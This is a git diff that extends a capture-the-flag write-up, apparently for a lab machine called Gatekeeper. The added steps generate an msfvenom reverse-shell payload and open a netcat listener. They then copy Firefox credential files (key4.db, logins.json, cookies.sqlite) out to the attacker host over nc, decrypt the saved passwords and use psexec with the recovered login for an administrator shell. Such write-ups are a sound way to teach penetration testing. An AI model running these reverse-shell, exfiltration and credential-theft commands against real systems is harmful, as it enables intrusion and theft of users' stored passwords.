@@ -76,9 +76,19 @@ Our return address is: **\xC3\x14\x04\x08**
 
 ## Exploitation
 
+First, we will create the payload and add it to our code
+
 ```bash
 msfvenom -p windows/shell_reverse_tcp LHOST=10.11.1.219 LPORT=4444 EXITFUNC=thread -b "\x00\x0a" -f py
 ```
+
+After that we create a listener
+
+```bash
+nc -nvlp 4444
+```
+
+And run our script
 
 ```bash
 python2 crasher.py
@@ -86,7 +96,79 @@ python2 crasher.py
 
 ## Post Exploitation
 
+After looking around in the machine for a long time and not founding
+anything to exploit, I noticed the hint that the **Mayor** gave
+
+`But beware, fire awaits on the other side`
+
+Fire.. Firefox!!!
+
+My first idea for no reason at all (I don't know exactly what am I doing),
+was to maybe find some credentials in firefox cache or something
+
+Searching and finding some articles about firefox, I figured out with
+a little bit of help that firefox stores passwords in the:
+`AppData\Roaming\Mozilla\Firefox\Profiles` directory.
+
+I din't want to use metasploit so I downloaded a static binary of **nc**
+in the machine and started mannually downloading the files
+[transfers with nc](https://nakkaya.com/2009/04/15/using-netcat-for-file-transfers/)
+that [this](https://support.mozilla.org/en-US/kb/profiles-where-firefox-stores-user-data#w_finding-your-profile-without-opening-firefox)
+article said where the password files.
+
+I also found a tool called [firefox_decrypt](https://github.com/unode/firefox_decrypt)
+
+So the files I downloaded where **key4.db, cert.db, logins.json, cookies.sqlite**
+
+On my machine
+
+```bash
+nc -l -p 1234 > key4.db
+```
+
+On the gatekeeper machine
+
+```bash
+nc -w 3 10.11.1.219 1234 < key4.db
+```
+
+All that's left now it's to run the decryptor and hope we get in.
+
 ## Priviledge Escalation
+
+In order to run the firefox_decryptor, I did
+
+```bash
+python2 firefox_decrypt ~/thm/medium/ctfs/gatekeeper/decr
+```
+
+And boom!! I got a hit. We have credentials for something
+
+```bash
+Website:   https://creds.com
+Username: 'mayor'
+Password: '8CL7O1N78MdrCIsV'
+```
+
+Going back to the start and looking at the nmap scan.
+We have smb open so let's try it.
+
+```bash
+smbclient --user=mayor \\\\10.10.80.38\\ADMIN$
+```
+
+It works!!!  
+We also see that we can write into the smb forlder  
+But I am lazy so with **psexec.py** from the impacket suite  
+We get a nice shell.
+
+```bash
+psexec.py mayor:8CL7O1N78MdrCIsV@10.10.80.38 cmd
+```
+
+The root flag is located in the mayor's Desktop.
+
+Amazing room! Had a lot of fun and learned a lot.
 
 ```json
 ```
